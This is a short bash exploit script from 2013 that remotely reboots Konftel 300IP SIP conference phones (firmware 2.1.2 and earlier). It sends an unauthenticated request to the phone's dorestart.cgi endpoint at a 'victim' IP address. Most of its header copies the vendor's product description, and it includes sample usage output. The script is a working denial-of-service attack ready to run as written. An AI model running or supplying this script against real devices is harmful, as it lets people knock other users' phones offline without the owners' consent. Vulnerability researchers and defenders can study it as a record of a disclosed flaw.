#!/bin/bash 
# Konftel 300IP SIP-based Conference phone <= 2.1.2 remote bypass reboot exploit
#
# by Todor Donev / 03.2013 / Sofia,Bulgaria
# email: todor dot donev at gmail com
# type: hardware
#
# The Konftel 300IP is a flexible SIP-based conference phone,
# perfect for companies that use IP voice services. Its clear, 
# natural sound comes from OmniSound HD, Konftel’s patented 
# wideband audio technology. The stylishly designed 
# Konftel 300IP is packed with intelligent features for more
# efficient conference calls. Record and store meetings on a
# SD memory card. Use the conference guide to call 
# pre-programmed groups with just a few simple pushes of a
# button. Conveniently import and export contact details via 
# the Web interface. Create your own phone book with the 
# personal user profile feature. The Konftel 300IP is also 
# ideal for larger conferences since it can accommodate 
# expansion microphones, an external wireless headset and a 
# PA system. With the Konftel 300IP your company will have 
# a conference phone that combines all the benefits of IP 
# voice service with innovative new features.
#
# Example usage:
# [exploits@amnesium]$ ./k300IP-rbr.sh 192.168.1.180
# Konftel 300IP SIP-based Conference phone <= 2.1.2 remote bypass reboot exploit
# Rebooting 192.168.1.180..
# Sleeping 30 secs, before rebooting
# curl: (7) couldn't connect to host
#
# Special greetings for Tsvetelina Emirska, Stilyan Angelov and all my other friends!

if [ $# != 1 ]; then
        echo "usg: $0 <victim>"
        exit;
fi
echo "Konftel 300IP SIP-based Conference phone <= 2.1.2 remote bypass reboot exploit"
echo "Rebooting $1.."
curl http://$1/cgi-bin/dorestart.cgi?doit=Reboot &>/dev/null
echo "Sleeping 30 secs before rebooting"
sleep 30
curl $1
